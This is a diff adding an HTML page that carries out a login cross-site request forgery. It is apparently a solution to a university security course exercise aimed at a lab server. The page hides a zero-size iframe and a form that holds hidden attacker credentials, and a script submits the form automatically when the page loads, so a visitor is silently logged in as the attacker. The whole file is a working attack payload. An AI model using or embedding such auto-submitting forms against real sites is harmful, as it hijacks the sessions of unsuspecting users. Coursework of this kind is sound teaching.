@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+
+<iframe name="attack_frame" style="position: absolute;width:0;height:0;border:0;"></iframe>
+<form method="POST" action="http://cpsc4200.mpese.com/login?csrfdefense=0&xssdefense=4" id="csrf_attack" target="attack_frame">
+  <input type="hidden" name="username" value="attacker" />
+  <input type="hidden" name="password" value="l33th4x" />
+</form>
+<script> document.getElementById("csrf_attack").submit()</script>
+
+</html>
